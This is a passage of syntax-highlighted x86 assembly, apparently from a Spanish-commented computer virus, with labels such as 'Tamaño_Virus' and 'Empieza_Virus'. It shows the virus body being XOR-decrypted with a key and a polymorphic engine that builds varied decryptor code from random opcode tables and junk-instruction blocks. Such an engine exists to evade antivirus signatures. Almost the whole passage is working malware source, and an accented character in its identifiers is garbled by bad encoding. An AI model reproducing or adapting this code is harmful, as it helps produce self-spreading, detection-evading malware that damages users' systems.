  </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Llave</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@EC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">MOVSD</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">4h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@EC</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">MEM_DECOMMIT</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Virus</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Memoria</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">VirtualFree</span><span class="sc0">

  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">Guarda_DC</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_EC</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">Llave</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">Memoria</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">Ultimo_Dia</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">

  </span><span class="sc1">; Instrucciones esenciales</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">@I0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; CALL Delta</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">@I1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">@I2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DELTA</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">@I3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Empieza_Virus</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">@I4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Virus</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">@I5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">037h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">@I6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">@I7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@I5</span><span class="sc4">)-</span><span class="sc2">4d</span><span class="sc0">

  </span><span class="sc1">; De Seis bytes.</span><span class="sc0">

  </span><span class="sc5">@6Bytes</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">                           </span><span class="sc1">; ADD EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2h</span><span class="sc0">                           </span><span class="sc1">; ADD EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc0">                           </span><span class="sc1">; ADD ESI</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">                           </span><span class="sc1">; SUB EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                           </span><span class="sc1">; SUB EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc0">                           </span><span class="sc1">; SUB ESI</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F3h</span><span class="sc0">                           </span><span class="sc1">; XOR EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F2h</span><span class="sc0">                           </span><span class="sc1">; XOR EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">                           </span><span class="sc1">; XOR ESI</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                           </span><span class="sc1">; IMUL EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc0">                           </span><span class="sc1">; IMUL EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc0">                           </span><span class="sc1">; IMUL EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">                           </span><span class="sc1">; IMUL ESI</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc0">                           </span><span class="sc1">; AND EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">                           </span><span class="sc1">; AND EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc0">                           </span><span class="sc1">; AND ESI</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CBh</span><span class="sc0">                           </span><span class="sc1">; OR EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAh</span><span class="sc0">                           </span><span class="sc1">; OR EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEh</span><span class="sc0">                           </span><span class="sc1">; OR ESI</span><span class="sc0">

  </span><span class="sc1">; Colocar un opcode de seis bytes...</span><span class="sc0">

  </span><span class="sc5">@Meter_Opcode_6B</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">018d</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">
  </span><span class="sc6">IMUL</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@6Bytes</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">MOVSW</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">
  </span><span class="sc6">MOVSD</span><span class="sc0">

  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc1">; Instrucciones de cinco bytes.</span><span class="sc0">

  </span><span class="sc5">@5Bytes</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">                                 </span><span class="sc1">; MOV EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc0">                                 </span><span class="sc1">; MOV EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc0">                                 </span><span class="sc1">; MOV EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc0">                                 </span><span class="sc1">; MOV ESI</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc0">                                 </span><span class="sc1">; ADD EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">02Dh</span><span class="sc0">                                 </span><span class="sc1">; SUB EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">035h</span><span class="sc0">                                 </span><span class="sc1">; XOR EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc0">                                 </span><span class="sc1">; AND EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0D7h</span><span class="sc0">                                 </span><span class="sc1">; OR EAX</span><span class="sc0">

  </span><span class="sc1">; Colocar un opcode de cinco bytes.</span><span class="sc0">

  </span><span class="sc5">@Meter_Opcode_5B</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">08d</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@5Bytes</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">MOVSB</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">
  </span><span class="sc6">MOVSD</span><span class="sc0">

  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc1">; Intrucciones de dos bytes.</span><span class="sc0">

  </span><span class="sc5">@2Bytes</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                           </span><span class="sc1">; ADD EAX, EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                           </span><span class="sc1">; XOR EAX, EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc0">                           </span><span class="sc1">; ADD EBX, EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc0">                           </span><span class="sc1">; XOR EBX, EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc0">                           </span><span class="sc1">; ADD EDX, EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc0">                           </span><span class="sc1">; XOR EDX, EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">                           </span><span class="sc1">; ADD EAX, EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">                           </span><span class="sc1">; ADD EAX, EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">                           </span><span class="sc1">; XOR EAX, EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">                           </span><span class="sc1">; XOR EAX, EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">                           </span><span class="sc1">; XOR EBX, EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc0">                           </span><span class="sc1">; XOR EBX, EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2h</span><span class="sc0">                           </span><span class="sc1">; XOR EDX, EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAh</span><span class="sc0">                           </span><span class="sc1">; XOR EDX, EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">                           </span><span class="sc1">; ADD ESI, ESI</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">                           </span><span class="sc1">; XOR ESI, ESI</span><span class="sc0">

  </span><span class="sc5">@Meter_Opcode_2B</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">15d</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@2Bytes</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">MOVSB</span><span class="sc0">
  </span><span class="sc6">MOVSB</span><span class="sc0">
  </span><span class="sc6">RET</span><span class="sc0">


  </span><span class="sc1">; Instrucciones de un byte.</span><span class="sc0">

  </span><span class="sc5">@1Byte</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc0">                                  </span><span class="sc1">; INC ESI</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">04Eh</span><span class="sc0">                                  </span><span class="sc1">; DEC ESI</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">                                  </span><span class="sc1">; INC EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">042h</span><span class="sc0">                                  </span><span class="sc1">; INC EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc0">                                  </span><span class="sc1">; INC EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">04Ah</span><span class="sc0">                                  </span><span class="sc1">; DEC EDX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc0">                                  </span><span class="sc1">; DEC EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">04Bh</span><span class="sc0">                                  </span><span class="sc1">; DEC EBX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">092h</span><span class="sc0">                                  </span><span class="sc1">; XCHG EDX, EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">093h</span><span class="sc0">                                  </span><span class="sc1">; XCHG EBX, EAX</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">096h</span><span class="sc0">                                  </span><span class="sc1">; XCHG ESI, EAX</span><span class="sc0">


  </span><span class="sc1">; Colocar opcode de un byte.</span><span class="sc0">

  </span><span class="sc5">@Meter_Opcode_1B</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@1Byte</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">MOVSB</span><span class="sc0">

  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc1">; Este proceso rellena cada bloque de 24 bytes con varias combinaciones</span><span class="sc0">
  </span><span class="sc1">; diferentes de opcodes.</span><span class="sc0">

  </span><span class="sc5">@Colocar_Opcodes</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">04d</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

  </span><span class="sc5">@CO_1</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc1">; Manera1: 20%     0-20</span><span class="sc0">
  </span><span class="sc1">; Manera2: 20%    20-40</span><span class="sc0">
  </span><span class="sc1">; Manera3: 20%    40-60</span><span class="sc0">
  </span><span class="sc1">; Manera4: 10%    60-70</span><span class="sc0">
  </span><span class="sc1">; Manera5: 15%    70-85</span><span class="sc0">
  </span><span class="sc1">; Manera6: 15%    85-100</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">20d</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">
  </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">@CO_Manera1</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc0">
  </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">@CO_Manera2</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
  </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">@CO_Manera3</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14d</span><span class="sc0">
  </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">@CO_Manera4</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17d</span><span class="sc0">
  </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">@CO_Manera5</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20d</span><span class="sc0">
  </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">@CO_Manera6</span><span class="sc0">

  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@CO_1</span><span class="sc0">

  </span><span class="sc5">@CO_Regresa</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@CO_1</span><span class="sc0">

  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">@CO_Manera1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_6B</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@CO_Regresa</span><span class="sc0">

  </span><span class="sc5">@CO_Manera2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_1B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_5B</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@CO_Regresa</span><span class="sc0">

  </span><span class="sc5">@CO_Manera3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_5B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_1B</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@CO_Regresa</span><span class="sc0">

  </span><span class="sc5">@CO_Manera4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_2B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_2B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_2B</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@CO_Regresa</span><span class="sc0">

  </span><span class="sc5">@CO_Manera5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_2B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_1B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_2B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_1B</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@CO_Regresa</span><span class="sc0">

  </span><span class="sc5">@CO_Manera6</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_1B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_2B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_2B</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Meter_Opcode_1B</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@CO_Regresa</span><span class="sc0">

  </span><span class="sc1">; Generador de numeros aleatorios de congruencia linear.</span><span class="sc0">
